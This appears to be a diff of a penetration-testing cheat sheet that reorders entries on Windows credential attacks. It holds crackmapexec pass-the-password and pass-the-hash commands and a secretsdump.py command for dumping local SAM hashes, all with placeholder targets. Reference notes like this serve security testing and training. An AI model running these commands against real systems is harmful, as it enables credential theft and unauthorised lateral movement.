@@ -62,13 +62,13 @@ Pass the Password
 --------------------------------------------------------
 > crackmapexec smb <ip/cidr> -u <user> -d <domain> -p <pass>
 
-Dump Local Hashes (SAM)
---------------------------------------------------------
-> secretsdump.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP>
-
 Pass the Hash
 --------------------------------------------------------
 > crackmapexec smb <ip/cidr> -u <user> -H <HASH> --local-auth
+
+Dump Local Hashes (SAM)
+--------------------------------------------------------
+> secretsdump.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP>
 
 Gaining Shell using dumped Hashed password
 --------------------------------------------------------
